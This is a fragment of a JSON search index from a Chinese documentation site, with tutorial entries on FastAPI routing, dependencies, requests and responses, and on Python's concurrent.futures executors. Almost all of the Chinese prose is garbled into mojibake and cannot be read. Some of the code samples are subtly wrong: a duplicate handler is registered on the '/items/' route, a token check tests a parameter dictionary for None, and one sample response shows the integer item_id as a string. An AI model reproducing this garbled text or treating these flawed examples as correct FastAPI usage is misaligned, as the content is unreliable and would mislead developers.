æ–‡æ¡£æœåŠ¡ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥é€šè¿‡è®¿é—®: http://127.0.0.1:8000/docs æ¥æ‰“å¼€ Swagger UI é£æ ¼çš„æ–‡æ¡£ æˆ–è€…è®¿é—®: http://127.0.0.1:8000/redoc æ¥æ‰“å¼€ ReDoc é£æ ¼çš„æ–‡æ¡£ã€‚ ReDoc æ˜¯å¦ä¸€ç§äº¤äº’å¼æ–‡æ¡£ç•Œé¢ï¼Œå…·æœ‰æ¸…æ™°ç®€æ´çš„å¤–è§‚ã€‚ å®ƒä½¿å¾—å¼€å‘è€…èƒ½å¤Ÿä»¥å¯è¯»æ€§å¼ºçš„æ–¹å¼æŸ¥çœ‹ API çš„æè¿°ã€è¯·æ±‚å’Œå“åº”ã€‚ ä¸ Swagger UI ä¸åŒï¼Œ ReDoc çš„è®¾è®¡å¼ºè°ƒæ–‡æ¡£çš„å¯è§†åŒ–å’Œç”¨æˆ·ä½“éªŒã€‚ æ³¨è§£ ä¸ªäººæ„Ÿè§‰ ReDoc å¥½çœ‹äº›, ä¸è¿‡ ReDoc è²Œä¼¼ä¸æ”¯æŒåœ¨æ–‡æ¡£è°ƒç”¨API äº¤äº’å¼æ–‡æ¡£çš„ä¼˜åŠ¿ å®æ—¶æ›´æ–° äº¤äº’å¼æ–‡æ¡£ä¼šå®æ—¶æ›´æ–°ï¼Œåæ˜ å‡ºåº”ç”¨ä»£ç çš„æœ€æ–°æ›´æ”¹ã€‚ è‡ªåŠ¨éªŒè¯ è¾“å…¥å‚æ•°çš„ç±»å‹å’Œæ ¼å¼ä¼šå¾—åˆ°è‡ªåŠ¨éªŒè¯ï¼Œé™ä½äº†é”™è¯¯çš„å¯èƒ½æ€§ã€‚ ä¾¿äºæµ‹è¯• å¯ä»¥ç›´æ¥åœ¨æ–‡æ¡£ä¸­è¿›è¡Œ API è¯·æ±‚æµ‹è¯•ï¼Œé¿å…ä½¿ç”¨å…¶ä»–å·¥å…·ã€‚ å‡çº§å®ä¾‹ æˆ‘ä»¬å€ŸåŠ© Pydantic æ¥ä½¿ç”¨æ ‡å‡†çš„ Python ç±»å‹å£°æ˜è¯·æ±‚ä½“: from typing import Union from fastapi import FastAPI from pydantic import BaseModel app = FastAPI() class Item(BaseModel): name: str price: float is_offer: Union[bool, None] = None @app.get(\"/\") def read_root(): return {\"Hello\": \"World\"} @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: Union[str, None] = None): return {\"item_id\": item_id, \"q\": q} @app.put(\"/items/{item_id}\") def update_item(item_id: int, item: Item): return {\"item_name\": item.name, \"item_id\": item_id}","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Interactive-API-document.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Interactive-API-document.html"},{"title":"è·¯å¾„æ“ä½œä¾èµ–é¡¹","text":"å‚è€ƒ: FastAPI è·¯å¾„æ“ä½œä¾èµ–é¡¹ FastAPI æä¾›äº†ç®€å•æ˜“ç”¨ï¼Œä½†åŠŸèƒ½å¼ºå¤§çš„ä¾èµ–æ³¨å…¥ç³»ç»Ÿï¼Œ è¿™ä¸ªä¾èµ–ç³»ç»Ÿè®¾è®¡çš„ç®€å•æ˜“ç”¨ï¼Œå¯ä»¥è®©å¼€å‘äººå‘˜è½»æ¾åœ°æŠŠç»„ä»¶é›†æˆè‡³ FastAPIã€‚ FastAPI æä¾›äº†è·¯å¾„æ“ä½œä¾èµ–é¡¹ï¼ˆPath Operation Dependenciesï¼‰çš„æœºåˆ¶ï¼Œ å…è®¸ä½ åœ¨è·¯ç”±å¤„ç†å‡½æ•°æ‰§è¡Œä¹‹å‰æˆ–ä¹‹åè¿è¡Œä¸€äº›é¢å¤–çš„é€»è¾‘ã€‚ ä¾èµ–é¡¹å°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸”å¯ä»¥ä½¿ç”¨ä¸è·¯å¾„æ“ä½œå‡½æ•°ç›¸åŒçš„å‚æ•°ã€‚ è·¯å¾„æ“ä½œä¾èµ–é¡¹æä¾›äº†ä¸€ç§çµæ´»çš„æ–¹å¼æ¥ç»„ç»‡ä»£ç ã€éªŒè¯è¾“å…¥ã€è¿›è¡Œèº«ä»½éªŒè¯ç­‰ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šå…·ä½“ä»‹ç» FastAPI è·¯å¾„æ“ä½œä¾èµ–é¡¹çš„ç›¸å…³çŸ¥è¯†ç‚¹ã€‚ ä¾èµ–é¡¹ï¼ˆDependenciesï¼‰ ä¾èµ–é¡¹æ˜¯åœ¨è·¯ç”±æ“ä½œå‡½æ•°æ‰§è¡Œå‰æˆ–åè¿è¡Œçš„å¯å¤ç”¨çš„å‡½æ•°æˆ–å¯¹è±¡ã€‚ å®ƒä»¬è¢«ç”¨äºæ‰§è¡Œä¸€äº›é€šç”¨çš„é€»è¾‘ï¼Œå¦‚éªŒè¯ã€èº«ä»½éªŒè¯ã€æ•°æ®åº“è¿æ¥ç­‰ã€‚ åœ¨ FastAPI ä¸­ï¼Œä¾èµ–é¡¹é€šå¸¸ç”¨äºä¸¤ä¸ªæ–¹é¢ï¼š é¢„å¤„ç†ï¼ˆBeforeï¼‰ä¾èµ–é¡¹ï¼š åœ¨è·¯ç”±æ“ä½œå‡½æ•°æ‰§è¡Œå‰è¿è¡Œï¼Œç”¨äºé¢„å¤„ç†è¾“å…¥æ•°æ®ï¼ŒéªŒè¯è¯·æ±‚ç­‰ã€‚ åå¤„ç†ï¼ˆAfterï¼‰ä¾èµ–é¡¹ï¼š åœ¨è·¯ç”±æ“ä½œå‡½æ•°æ‰§è¡Œåè¿è¡Œï¼Œç”¨äºæ‰§è¡Œä¸€äº›åå¤„ç†é€»è¾‘ï¼Œå¦‚æ—¥å¿—è®°å½•ã€æ¸…ç†ç­‰ã€‚ ä¾èµ–æ³¨å…¥ ä¾èµ–æ³¨å…¥æ˜¯ å°†ä¾èµ–é¡¹æ³¨å…¥åˆ°è·¯ç”±æ“ä½œå‡½æ•°ä¸­çš„è¿‡ç¨‹ åœ¨ FastAPI ä¸­ï¼Œé€šè¿‡ åœ¨è·¯ç”±æ“ä½œå‡½æ•°å‚æ•°ä¸­å£°æ˜ä¾èµ–é¡¹ æ¥å®ç°ä¾èµ–æ³¨å…¥ã€‚ FastAPI å°†è´Ÿè´£è§£æä¾èµ–é¡¹çš„å‚æ•°ï¼Œå¹¶ç¡®ä¿åœ¨æ‰§è¡Œè·¯ç”±æ“ä½œå‡½æ•°ä¹‹å‰å°†å…¶ä¼ é€’ç»™å‡½æ•°ã€‚ ä¾èµ–é¡¹çš„ä½¿ç”¨ å®šä¹‰ä¾èµ–é¡¹: from fastapi import Depends, FastAPI app = FastAPI() # ä¾èµ–é¡¹å‡½æ•° def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œcommon_parameters æ˜¯ä¸€ä¸ªä¾èµ–é¡¹å‡½æ•°ï¼Œç”¨äºé¢„å¤„ç†æŸ¥è¯¢å‚æ•°ã€‚ åœ¨è·¯ç”±ä¸­ä½¿ç”¨ä¾èµ–é¡¹: from fastapi import Depends # è·¯ç”±æ“ä½œå‡½æ•° @app.get(\"/items/\") async def read_items(commons: dict = Depends(common_parameters)): return commons åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œread_items è·¯ç”±æ“ä½œå‡½æ•°ä¸­çš„å‚æ•° commons ä½¿ç”¨äº† Depends(common_parameters)ï¼Œ è¡¨ç¤º common_parameters æ˜¯ä¸€ä¸ªä¾èµ–é¡¹ã€‚ FastAPI å°†åœ¨æ‰§è¡Œè·¯ç”±æ“ä½œå‡½æ•°ä¹‹å‰è¿è¡Œ common_parameters å‡½æ•°ï¼Œå¹¶å°†å…¶è¿”å›çš„ç»“æœä¼ é€’ç»™ read_items å‡½æ•°ã€‚ è·¯å¾„æ“ä½œä¾èµ–é¡¹çš„åŸºæœ¬ä½¿ç”¨ é¢„å¤„ç†ï¼ˆBeforeï¼‰ ä»¥ä¸‹å®ä¾‹ä¸­ï¼Œcommon_parameters æ˜¯ä¸€ä¸ªä¾èµ–é¡¹å‡½æ•°ï¼Œ å®ƒæ¥å—æŸ¥è¯¢å‚æ•° qã€skip å’Œ limitï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«è¿™äº›å‚æ•°çš„å­—å…¸ã€‚ åœ¨è·¯ç”±æ“ä½œå‡½æ•° read_items ä¸­ï¼Œé€šè¿‡ä¼ å…¥ Depends(common_parameters)ï¼Œ æˆ‘ä»¬ä½¿ç”¨äº†è¿™ä¸ªä¾èµ–é¡¹å‡½æ•°ï¼Œå®ç°äº†åœ¨è·¯ç”±æ‰§è¡Œå‰é¢„å¤„ç†è¾“å…¥æ•°æ®çš„åŠŸèƒ½: from fastapi import Depends, FastAPI, HTTPException app = FastAPI() # ä¾èµ–é¡¹å‡½æ•° def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} # è·¯ç”±æ“ä½œå‡½æ•° @app.get(\"/items/\") async def read_items(commons: dict = Depends(common_parameters)): return commons åå¤„ç†ï¼ˆAfterï¼‰ ä»¥ä¸‹ä¾‹å­ä¸­, after_request æ˜¯ä¸€ä¸ªåå¤„ç†å‡½æ•°ï¼Œç”¨äºåœ¨è·¯ç”±æ‰§è¡Œåæ‰§è¡Œä¸€äº›é€»è¾‘ã€‚ åœ¨è·¯ç”±æ“ä½œå‡½æ•° read_items_after ä¸­ï¼Œé€šè¿‡ä¼ å…¥ Depends(after_request) ï¼Œ æˆ‘ä»¬ä½¿ç”¨äº†è¿™ä¸ªåå¤„ç†ä¾èµ–é¡¹ï¼Œå®ç°äº†åœ¨è·¯ç”±æ‰§è¡Œåè¿›è¡Œé¢å¤–æ“ä½œçš„åŠŸèƒ½: from fastapi import Depends, FastAPI, HTTPException app = FastAPI() # ä¾èµ–é¡¹å‡½æ•° def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} # è·¯ç”±æ“ä½œå‡½æ•° @app.get(\"/items/\") async def read_items(commons: dict = Depends(common_parameters)): return commons # åå¤„ç†å‡½æ•° async def after_request(): # è¿™é‡Œå¯ä»¥æ‰§è¡Œä¸€äº›åå¤„ç†é€»è¾‘ï¼Œæ¯”å¦‚è®°å½•æ—¥å¿— pass # åå¤„ç†ä¾èµ–é¡¹ @app.get(\"/items/\", response_model=dict) async def read_items_after(request: dict = Depends(after_request)): return {\"message\": \"Items returned successfully\"} å¤šä¸ªä¾èµ–é¡¹çš„ç»„åˆ ä»¥ä¸‹ä¾‹å­ä¸­ï¼Œcommon_parameters å’Œ verify_token æ˜¯ä¸¤ä¸ªä¸åŒçš„ä¾èµ–é¡¹å‡½æ•°ï¼Œ verify_token ä¾èµ–äº common_parametersï¼Œè¿™ç§ç»„åˆä¾èµ–é¡¹çš„æ–¹å¼å…è®¸æˆ‘ä»¬åœ¨è·¯ç”±æ‰§è¡Œå‰å…ˆéªŒè¯ä¸€äº›å‚æ•°ï¼Œç„¶ååœ¨è¿›è¡Œèº«ä»½éªŒè¯: from fastapi import Depends, FastAPI, HTTPException app = FastAPI() # ä¾èµ–é¡¹å‡½æ•°1 def common_parameters(q: str = None, skip: int = 0, limit: int = 100): return {\"q\": q, \"skip\": skip, \"limit\": limit} # ä¾èµ–é¡¹å‡½æ•°2 def verify_token(token: str = Depends(common_parameters)): if token is None: raise HTTPException(status_code=400, detail=\"Token required\") return token # è·¯ç”±æ“ä½œå‡½æ•° @app.get(\"/items/\") async def read_items(token: dict = Depends(verify_token)): return token å¼‚æ­¥ä¾èµ–é¡¹ ä¾èµ–é¡¹å‡½æ•°å’Œåå¤„ç†å‡½æ•°å¯ä»¥æ˜¯å¼‚æ­¥çš„ï¼Œå…è®¸åœ¨å®ƒä»¬å†…éƒ¨æ‰§è¡Œå¼‚æ­¥æ“ä½œã€‚ ä»¥ä¸‹ä¾‹å­ä¸­ï¼Œget_token æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„ä¾èµ–é¡¹å‡½æ•°ï¼Œæ¨¡æ‹Ÿäº†ä¸€ä¸ªå¼‚æ­¥æ“ä½œã€‚ åœ¨è·¯ç”±æ“ä½œå‡½æ•° read_items ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†è¿™ä¸ªå¼‚æ­¥ä¾èµ–é¡¹å‡½æ•°: from fastapi import Depends, FastAPI, HTTPException from typing import Optional import asyncio app = FastAPI() # å¼‚æ­¥ä¾èµ–é¡¹å‡½æ•° async def get_token(): # æ¨¡æ‹Ÿå¼‚æ­¥æ“ä½œ await asyncio.sleep(2) return \"fake-token\" # å¼‚æ­¥è·¯ç”±æ“ä½œå‡½æ•° @app.get(\"/items/\") async def read_items(token: Optional[str] = Depends(get_token)): return {\"token\": token} é€šè¿‡ä½¿ç”¨è·¯å¾„æ“ä½œä¾èµ–é¡¹ï¼Œä½ å¯ä»¥åœ¨è·¯ç”±æ‰§è¡Œå‰æˆ–åæ‰§è¡Œé¢å¤–çš„é€»è¾‘ï¼Œä»è€Œå®ç°æ›´çµæ´»ã€å¯ç»„åˆçš„ä»£ç ç»„ç»‡æ–¹å¼ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Path-operation-dependencies.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Path-operation-dependencies.html"},{"title":"è¯·æ±‚å’Œå“åº”","text":"å‚è€ƒ: FastAPI è¯·æ±‚å’Œå“åº” åœ¨ FastAPI ä¸­ï¼Œè¯·æ±‚ï¼ˆRequestï¼‰å’Œå“åº”ï¼ˆResponseï¼‰æ˜¯ä¸å®¢æˆ·ç«¯äº¤äº’çš„æ ¸å¿ƒã€‚ FastAPI æä¾›äº†å¼ºå¤§çš„å·¥å…·æ¥è§£æè¯·æ±‚æ•°æ®ï¼Œå¹¶æ ¹æ®éœ€è¦ç”Ÿæˆè§„èŒƒçš„å“åº”ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è¯¦ç»†çœ‹ä¸‹ FastAPI çš„è¯·æ±‚å’Œå“åº”ã€‚ HTTP ç›¸å…³å†…å®¹å¯ä»¥å‚è€ƒ: HTTP è¯·æ±‚æ–¹æ³• è¯·æ±‚æ•°æ® æŸ¥è¯¢å‚æ•° ä»¥ä¸‹å®ä¾‹ä¸­æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª /items/ è·¯ç”±ï¼Œæ¥å—ä¸¤ä¸ªæŸ¥è¯¢å‚æ•° skip å’Œ limitï¼Œå®ƒä»¬çš„ç±»å‹å‡ä¸ºæ•´æ•°ï¼Œé»˜è®¤å€¼åˆ†åˆ«ä¸º 0 å’Œ 10: from fastapi import FastAPI app = FastAPI() @app.get(\"/items/\") def read_item(skip: int = 0, limit: int = 10): return {\"skip\": skip, \"limit\": limit} åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥å¯åŠ¨åº”ç”¨: uvicorn main:app --reload ç°åœ¨ï¼Œæ‰“å¼€æµè§ˆå™¨å¹¶è®¿é—® http://127.0.0.1:8000/items/ ï¼Œè¿”å›äº†é»˜è®¤çš„ JSON æ•°æ®: {\"skip\": 0, \"limit\": 10} è·¯å¾„å‚æ•° æˆ‘ä»¬å¯ä»¥æŠŠå‚æ•°è®¾ç½®åœ¨è·¯å¾„ä¸Šï¼Œè¿™æ · URL çœ‹èµ·æ¥æ›´ç¾è§‚ä¸€äº›ã€‚ ä»¥ä¸‹å®ä¾‹æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå¸¦æœ‰è·¯å¾„å‚æ•° item_id å’ŒæŸ¥è¯¢å‚æ•° q çš„è·¯ç”±: from fastapi import FastAPI app = FastAPI() @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: str = None): return {\"item_id\": item_id, \"q\": q} ä¼ é€’ GET è¯·æ±‚çš„å‚æ•° http://127.0.0.1:8000/items/5/?q=runoob ï¼Œ è¿”å› JSON æ•°æ®å¦‚ä¸‹æ‰€ç¤º: {\"item_id\": 5, \"q\": \"runoob\"} è¯·æ±‚ä½“ æ¥ä¸‹æ¥æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ª /items/ è·¯ç”±ï¼Œ ä½¿ç”¨ @app.post è£…é¥°å™¨è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¤„ç† POST è¯·æ±‚çš„è·¯ç”±: from pydantic import BaseModel from fastapi import FastAPI app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.post(\"/items/\") def create_item(item: Item): return item ä½¿ç”¨ Pydantic æ¨¡å‹ Item å®šä¹‰äº†ä¸€ä¸ªè¯·æ±‚ä½“ï¼ŒåŒ…å«å¤šä¸ªå­—æ®µï¼Œ å…¶ä¸­ä¸€äº›æœ‰é»˜è®¤å€¼ï¼Œæ›´å¤š Pydantic ä»‹ç»å‚è€ƒ: FastAPI Pydantic æ¨¡å‹ æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ‰“å¼€ http://127.0.0.1:8000/docs æ¥è¿›è¡Œ POST æµ‹è¯•ï¼š å¡«å†™è¯·æ±‚å‚æ•°ï¼š è¿”å›ç»“æœ: å“åº”æ•°æ® è¿”å› JSON æ•°æ® è·¯ç”±å¤„ç†å‡½æ•°è¿”å›ä¸€ä¸ªå­—å…¸ï¼Œè¯¥å­—å…¸å°†è¢« FastAPI è‡ªåŠ¨è½¬æ¢ä¸º JSON æ ¼å¼ï¼Œå¹¶ä½œä¸ºå“åº”å‘é€ç»™å®¢æˆ·ç«¯: from fastapi import FastAPI app = FastAPI() @app.get(\"/items/\") def read_item(skip: int = 0, limit: int = 10): return {\"skip\": skip, \"limit\": limit} ä»¥ä¸Šä»£ç åœ¨æµè§ˆå™¨è®¿é—® http://127.0.0.1:8000/items/ ï¼Œè¿”å›äº† JSON æ•°æ®: {\"skip\": 0, \"limit\": 10} è¿”å› Pydantic æ¨¡å‹ è·¯ç”±å¤„ç†å‡½æ•°è¿”å›ä¸€ä¸ª Pydantic æ¨¡å‹å®ä¾‹ï¼ŒFastAPI å°† è‡ªåŠ¨å°†å…¶è½¬æ¢ä¸º JSON æ ¼å¼ ï¼Œå¹¶ä½œä¸ºå“åº”å‘é€ç»™å®¢æˆ·ç«¯: from pydantic import BaseModel from fastapi import FastAPI app = FastAPI() class Item(BaseModel): name: str description: str = None price: float tax: float = None @app.post(\"/items/\") def create_item(item: Item): return item POST è¯·æ±‚ï¼Œè¿”å›çš„æ•°æ®æ ¼å¼å¦‚ä¸‹æ‰€ç¤º: { \"name\": \"runoob\", \"description\": \"èœé¸Ÿæ•™ç¨‹ POST æµ‹è¯•\", \"price\": 12, \"tax\": 1 } è¯·æ±‚å¤´å’Œ Cookie ä½¿ç”¨ Header å’Œ Cookie ç±»å‹æ³¨è§£è·å–è¯·æ±‚å¤´å’Œ Cookie æ•°æ®: from fastapi import Header, Cookie from fastapi import FastAPI app = FastAPI() @app.get(\"/items/\") def read_item(user_agent: str = Header(None), session_token: str = Cookie(None)): return {\"User-Agent\": user_agent, \"Session-Token\": session_token} ä»¥ä¸Šä»£ç åœ¨æµè§ˆå™¨è®¿é—® http://127.0.0.1:8000/items/ ï¼Œè¿”å›äº† JSON æ•°æ®: {\"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15\",\"Session-Token\":null} é‡å®šå‘å’ŒçŠ¶æ€ç  ä½¿ç”¨ RedirectResponse å®ç°é‡å®šå‘ï¼Œå°†å®¢æˆ·ç«¯é‡å®šå‘åˆ° /items/ è·¯ç”±: from fastapi import Header, Cookie from fastapi import FastAPI from fastapi.responses import RedirectResponse app = FastAPI() @app.get(\"/items/\") def read_item(user_agent: str = Header(None), session_token: str = Cookie(None)): return {\"User-Agent\": user_agent, \"Session-Token\": session_token} @app.get(\"/redirect\") def redirect(): return RedirectResponse(url=\"/items/\") ä½¿ç”¨ HTTPException æŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›è‡ªå®šä¹‰çš„çŠ¶æ€ç å’Œè¯¦ç»†ä¿¡æ¯ã€‚ ä»¥ä¸‹å®ä¾‹åœ¨ item_id ä¸º 42 ä¼šè¿”å› 404 çŠ¶æ€ç : from fastapi import HTTPException @app.get(\"/items/{item_id}\") def read_item(item_id: int): if item_id == 42: raise HTTPException(status_code=404, detail=\"Item not found\") return {\"item_id\": item_id} è‡ªå®šä¹‰å“åº”å¤´ ä½¿ç”¨ JSONResponse è‡ªå®šä¹‰å“åº”å¤´: from fastapi import FastAPI from fastapi.responses import JSONResponse app = FastAPI() @app.get(\"/items/{item_id}\") def read_item(item_id: int): content = {\"item_id\": item_id} headers = {\"X-Custom-Header\": \"custom-header-value\"} return JSONResponse(content=content, headers=headers)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Request-and-response.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Request-and-response.html"},{"title":"ç®€å•ä½¿ç”¨","text":"å‚è€ƒ: ç¬¬ä¸€ä¸ª FastAPI åº”ç”¨ ç®€å•ä½¿ç”¨: # main.py from fastapi import FastAPI app = FastAPI() @app.get(\"/\") def read_root(): return {\"Hello\": \"World\"} åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥å¯åŠ¨åº”ç”¨: uvicorn main:app --reload æ³¨è§£ --reload è¡¨ç¤ºä»£ç ä¿®æ”¹åè‡ªåŠ¨é‡å¯æœåŠ¡å™¨ æ‰“å¼€æµè§ˆå™¨å¹¶è®¿é—® http://127.0.0.1:8000 ï¼Œ ä½ åº”è¯¥èƒ½å¤Ÿçœ‹åˆ° FastAPI è‡ªåŠ¨ç”Ÿæˆçš„äº¤äº’å¼æ–‡æ¡£ï¼Œå¹¶åœ¨æ ¹è·¯å¾„ (\"/\") è¿”å›çš„ JSON å“åº”: {\"Hello\": \"World\"} æ¥ä¸‹æ¥æˆ‘ä»¬æ¥ä¸°å¯Œä¸‹ä»£ç åŠŸèƒ½ï¼Œå¹¶åšå…·ä½“è¯´æ˜ ä»¥ä¸‹çš„ FastAPI åº”ç”¨ï¼Œä½¿ç”¨äº†ä¸¤ä¸ªè·¯ç”±æ“ä½œï¼ˆ/ å’Œ /items/{item_id}ï¼‰: from typing import Union from fastapi import FastAPI app = FastAPI() @app.get(\"/\") def read_root(): return {\"Hello\": \"World\"} @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: Union[str, None] = None): return {\"item_id\": item_id, \"q\": q} å…¶ä¸­, å®šä¹‰å¸¦è·¯å¾„å‚æ•°å’ŒæŸ¥è¯¢å‚æ•°çš„è·¯ç”±æ“ä½œ: @app.get(\"/items/{item_id}\") def read_item(item_id: int, q: Union[str, None] = None): return {\"item_id\": item_id, \"q\": q} å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°: item_id --æ˜¯è·¯å¾„å‚æ•°ï¼ŒæŒ‡å®šä¸ºæ•´æ•°ç±»å‹ã€‚ q -- æ˜¯æŸ¥è¯¢å‚æ•°ï¼ŒæŒ‡å®šä¸ºå­—ç¬¦ä¸²ç±»å‹æˆ–ç©ºï¼ˆNoneï¼‰ã€‚ è®¿é—®: http://127.0.0.1:8000/items/5?q=tttt9 ä½ å°†ä¼šçœ‹åˆ°å¦‚ä¸‹ JSON å“åº”: {\"item_id\":\"5\",\"q\":\"tttt9\"}","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Simply-use.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-Simply-use.html"},{"title":"å¸¸è§é—®é¢˜","text":"è‡ªå®šä¹‰è¯·æ±‚å¤´, è§ FastAPI-è‡ªå®šä¹‰è¯·æ±‚å¤´ é‡å®šå‘å’ŒçŠ¶æ€ç , è§ FastAPI-é‡å®šå‘å’ŒçŠ¶æ€ç  è‡ªå®šä¹‰å“åº”å¤´, è§ FastAPI-è‡ªå®šä¹‰å“åº”å¤´","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-common-problem.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Fastapi-common-problem.html"},{"title":"concurrent","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/concurrent.html ç›®å‰å°±ä¸€ä¸ªåŒ…: concurrent.futures â€”â€” å¯åŠ¨å¹¶è¡Œä»»åŠ¡ concurrent.futures æ¨¡å—æä¾›å¼‚æ­¥æ‰§è¡Œå¯è°ƒç”¨å¯¹è±¡é«˜å±‚æ¥å£ã€‚ å¼‚æ­¥æ‰§è¡Œå¯ä»¥ç”± ThreadPoolExecutor ä½¿ç”¨çº¿ç¨‹æˆ–ç”± ProcessPoolExecutor ä½¿ç”¨å•ç‹¬çš„è¿›ç¨‹æ¥å®ç°ã€‚ ä¸¤è€…éƒ½æ˜¯å®ç°æŠ½åƒç±» Executor å®šä¹‰çš„æ¥å£ã€‚ Executor class concurrent.futures.Executor æŠ½è±¡ç±»æä¾›å¼‚æ­¥æ‰§è¡Œè°ƒç”¨æ–¹æ³•ã€‚è¦é€šè¿‡å®ƒçš„å­ç±»è°ƒç”¨ï¼Œè€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ã€‚ ThreadPoolExecutor concurrent.futures.ThreadPoolExecutor ThreadPoolExecutor æ˜¯ Executor çš„å­ç±»ï¼Œå®ƒä½¿ç”¨çº¿ç¨‹æ± æ¥å¼‚æ­¥æ‰§è¡Œè°ƒç”¨ã€‚ å½“å¯è°ƒç”¨å¯¹è±¡å·²å…³è”äº†ä¸€ä¸ª Future ç„¶ååœ¨ç­‰å¾…å¦ä¸€ä¸ª Future çš„ç»“æœæ—¶å°±ä¼šå¯¼è‡´æ­»é”æƒ…å†µã€‚ä¾‹å¦‚: import time def wait_on_b(): time.sleep(5) print(b.result()) # b will never complete because it is waiting on a. return 5 def wait_on_a(): time.sleep(5) print(a.result()) # a will never complete because it is waiting on b. return 6 executor = ThreadPoolExecutor(max_workers=2) a = executor.submit(wait_on_b) b = executor.submit(wait_on_a) ä¸: def wait_on_future(): f = executor.submit(pow, 5, 2) # This will never complete because there is only one worker thread and # it is executing this function. print(f.result()) executor = ThreadPoolExecutor(max_workers=1) executor.submit(wait_on_future) ProcessPoolExecutor ProcessPoolExecutor ç±»æ˜¯ Executor çš„å­ç±»ï¼Œå®ƒä½¿ç”¨è¿›ç¨‹æ± æ¥å¼‚æ­¥åœ°æ‰§è¡Œè°ƒç”¨ã€‚ ProcessPoolExecutor ä¼šä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/multiprocessing æ¨¡å—ï¼Œ è¿™å…è®¸å®ƒç»•è¿‡ å…¨å±€è§£é‡Šå™¨é” ä½†ä¹Ÿæ„å‘³ç€åªå¯ä»¥å¤„ç†å’Œè¿”å›å¯å°å­˜çš„å¯¹è±¡ã€‚ __main__ æ¨¡å—å¿…é¡»å¯ä»¥è¢«å·¥ä½œè€…å­è¿›ç¨‹å¯¼å…¥ã€‚è¿™æ„å‘³ç€ ProcessPoolExecutor ä¸å¯ä»¥å·¥ä½œåœ¨äº¤äº’å¼è§£é‡Šå™¨ä¸­ã€‚ ä»å¯è°ƒç”¨å¯¹è±¡ä¸­è°ƒç”¨ Executor æˆ– Future çš„æ–¹æ³•æäº¤ç»™ ProcessPoolExecutor ä¼šå¯¼è‡´æ­»é”ã€‚ class concurrent.futures.ProcessPoolExecutor(max_workers=None, mp_context=None, initializer=None, initargs=(), max_tasks_per_child=None) å¼‚æ­¥åœ°æ‰§è¡Œè°ƒç”¨çš„ Executor å­ç±»ä½¿ç”¨æœ€å¤šå…·æœ‰ max_workers ä¸ªè¿›ç¨‹çš„è¿›ç¨‹æ± ã€‚ max_workers: å¦‚æœ max_workers ä¸º None æˆ–æœªç»™å‡ºï¼Œå®ƒå°†é»˜è®¤ä¸ºæœºå™¨çš„å¤„ç†å™¨ä¸ªæ•°ã€‚ å¦‚æœ max_workers å°äºç­‰äº 0ï¼Œåˆ™å°†å¼•å‘ ValueErrorã€‚ åœ¨ Windows ä¸Šï¼Œmax_workers å¿…é¡»å°äºç­‰äº 61ï¼Œå¦åˆ™å°†å¼•å‘ ValueErrorã€‚ å¦‚æœ max_workers ä¸º Noneï¼Œåˆ™æ‰€é€‰æ‹©çš„é»˜è®¤å€¼æœ€å¤šä¸º 61ï¼Œå³ä½¿å­˜åœ¨æ›´å¤šçš„å¤„ç†å™¨ã€‚ mp_context: å¯ä»¥æ˜¯ä¸€ä¸ªå¤šè¿›ç¨‹ä¸Šä¸‹æ–‡æˆ–æ˜¯ Noneã€‚ å®ƒå°†è¢«ç”¨æ¥å¯åŠ¨å·¥ä½œè¿›ç¨‹ã€‚ å¦‚æœ mp_context ä¸º None æˆ–æœªç»™å‡ºï¼Œåˆ™å°†ä½¿ç”¨é»˜è®¤çš„å¤šè¿›ç¨‹ä¸Šä¸‹æ–‡ã€‚ initializer: ä¸€ä¸ªå¯é€‰çš„å¯è°ƒç”¨å¯¹è±¡ï¼Œå®ƒä¼šåœ¨æ¯ä¸ªå·¥ä½œè¿›ç¨‹å¯åŠ¨æ—¶è¢«è°ƒç”¨ï¼› initargs: ä¼ ç»™ initializer 